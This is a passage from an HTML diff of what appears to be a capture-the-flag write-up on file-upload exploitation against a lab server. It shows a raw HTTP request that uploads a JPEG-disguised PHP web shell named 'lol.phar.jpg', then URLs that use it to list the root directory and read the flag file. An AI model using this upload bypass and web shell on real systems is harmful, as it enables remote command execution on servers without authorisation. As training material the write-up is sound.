+<span class="normal"><a href="#__codelineno-16-22">22</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a>POST /contact/upload.php HTTP/1.1
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2"></a>Host: 94.237.54.42:30291
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4"></a>Accept: */*
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7"></a>X-Requested-With: XMLHttpRequest
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8"></a>Content-Type: multipart/form-data; boundary=---------------------------407265977125623495441533709488
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9"></a>Content-Length: 509
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10"></a>Origin: http://94.237.54.42:30291
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11"></a>Connection: keep-alive
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12"></a>Referer: http://94.237.54.42:30291/contact/
+</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13"></a>Cookie: uid=96
+</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14"></a>
+</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15"></a>-----------------------------407265977125623495441533709488
+</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16"></a>Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;lol.phar.jpg&quot;
+</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17"></a>Content-Type: image/jpeg
+</span><span id="__span-16-18"><a id="__codelineno-16-18" name="__codelineno-16-18"></a>
+</span><span id="__span-16-19"><a id="__codelineno-16-19" name="__codelineno-16-19"></a>ÿØÿà JFIF      ÿá ¼Exif  II*                V       ^   (              i    f       H      H            0210           0100     ÿÿ       °       £      ÿÛ C       
+</span><span id="__span-16-20"><a id="__codelineno-16-20" name="__codelineno-16-20"></a>
+</span><span id="__span-16-21"><a id="__codelineno-16-21" name="__codelineno-16-21"></a><span class="cp">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</span>
+</span><span id="__span-16-22"><a id="__codelineno-16-22" name="__codelineno-16-22"></a>-----------------------------407265977125623495441533709488--
+</span></code></pre></div></td></tr></table></div>
+<p>Now, we just need to execute the shell in the browser:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
+<span class="normal"><a href="#__codelineno-17-2">2</a></span>
+<span class="normal"><a href="#__codelineno-17-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>http://94.237.54.42:30291/contact/user_feedback_submissions/250129_lol.phar.jpg?cmd=ls%20/
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a>http://94.237.54.42:30291/contact/user_feedback_submissions/250129_lol.phar.jpg?cmd=cat%20/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
+</span></code></pre></div></td></tr></table></div>
+<p>Results: HTB{m4573r1ng_upl04d_3xpl0174710n}</p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-27T20:44:57+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-27</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-29T20:22:03+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-29</span></small></br>
 
 
     <small>Created: January 26, 2025 19:15:53</small>
